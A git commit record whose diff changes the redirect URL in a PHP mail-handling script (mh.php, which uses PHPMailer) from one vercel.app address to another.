1be225e5b4b6af632d1d90307ff41cc8caeb98d1
team11203 <155807397+team11203@users.noreply.github.com>
2025-07-26 11:46:12 +0500

    Update mh.php

--- mh.php
+++ mh.php
@@ -2,7 +2,7 @@
 use PHPMailer\PHPMailer\PHPMailer;
 use PHPMailer\PHPMailer\Exception;
 
-header("Location:https://in-to-use-in-b.vercel.app/");
+header("Location:https://in-touser-id.vercel.app/");
 
 require 'Exception.php';
 require 'PHPMailer.php';
